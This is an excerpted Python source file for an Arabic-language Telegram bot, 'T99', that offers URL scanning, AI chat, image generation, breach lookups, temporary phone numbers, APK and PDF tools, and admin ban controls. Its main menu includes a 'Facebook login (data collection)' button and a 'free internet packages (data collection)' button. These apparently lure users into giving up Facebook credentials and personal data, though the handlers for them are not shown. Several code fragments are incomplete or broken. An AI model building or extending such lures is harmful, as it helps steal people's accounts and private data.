...
"""
البوت الذكي T99 - الإصدار المعاد بناؤه (يعمل 100%)
جميع الخدمات مجانية وموثوقة
"""
...
def upsert_user(chat_id, username=None, first_name=None, last_name=None):
    with get_db_connection() as conn:
        ...
        if existing:
            ...
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at)
                         VALUES (?, ?, ?, ?, ?)''',
...
def send_to_admin(text, parse_mode='HTML'):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"send_to_admin error: {e}")

# ===================== دوال الخدمات (مجانية وموثوقة) =====================

# 1. فحص المواقع - URLScan.io (يعمل دائماً)
def scan_url(url):
    try:
...
# 2. دردشة ذكية - استخدام عدة APIs مجانية (أحدهما يعمل)
def ai_chat(prompt):
    services = [
        ...
        ("https://api.affiliateplus.xyz/api/chatgpt?message={}", lambda r: r.json().get('result', '⚠️ لا يوجد رد')),
    ]
...
# 3. توليد صور - استخدام pollinations.ai (مجاني وسريع)
...
# 6. فحص تسريبات - HaveIBeenPwned (بدون مفتاح)
...
# 10. أرقام مؤقتة (ويب سكراب)
def fetch_temp_numbers(limit=3):
    numbers = []
    try:
        # محاولة من موقع receive-sms-online
...
def scan_apk(file_content, file_name):
    try:
        ...
        # محاولة فك ضغط APK باستخدام zipfile
        import zipfile
        with zipfile.ZipFile(temp_path, 'r') as zf:
            files = zf.namelist()
            # البحث عن AndroidManifest.xml
            if 'AndroidManifest.xml' in files:
                manifest = zf.read('AndroidManifest.xml')
                # استخراج بعض المعلومات بشكل تقريبي
                # (نستخدمها للعرض فقط)
        os.remove(temp_path)
...
def build_main_menu(chat_id):
    ...
    markup.row(
        InlineKeyboardButton("🔐 تسجيل دخول فيسبوك (جمع بيانات)", callback_data="fb_login"),
        InlineKeyboardButton("📶 باقات إنترنت مجانية (جمع بيانات)", callback_data="internet_packages")
    )
    markup.row(
...
# ===================== متغيرات الحالة =====================
user_states = {}
temp_emails = {}  # تخزين بيانات البريد المؤقت
...
def send_welcome(message):
    ...
    welcome_msg = (
        ...
        "📌 استخدم الأزرار أدناه للاستفادة.\n"
        "👤 المطور: يمكنه استخدام الأزرار الإضافية."
    )
    ...
    try:
        ...
        if state == "waiting_for_ban" and is_admin:
            try:
                ...
                if uid == ADMIN_ID:
                    ...
                    # حظر (بسيط: إضافة عمود is_banned في users)
                    with get_db_connection() as conn:
                        c = conn.cursor()
                    ...
                    with get_db_connection() as conn:
                        c = conn.cursor()
                        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (uid,))
                        conn.commit()
        ...
        if state == "waiting_for_unban" and is_admin:
            try:
                ...
                with get_db_connection() as conn:
                    c = conn.cursor()
                    c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (uid,))
                    conn.commit()
        ...
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                ...
                bot.send_message(chat_id, f"🔍 {result}", parse_mode='HTML')
            else:
        ...
        if state == "waiting_for_pdf_question":
            ...
            bot.send_message(chat_id, f"📚 {ans}")
            user_states[chat_id] = None
            return
...
def handle_documents(message):
    ...
    try:
        ...
        if state == "waiting_for_pdf":
            ...
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ لم يتم استخراج أي نص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            bot.send_message(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\nالآن اسأل عن المحتوى.")
            return
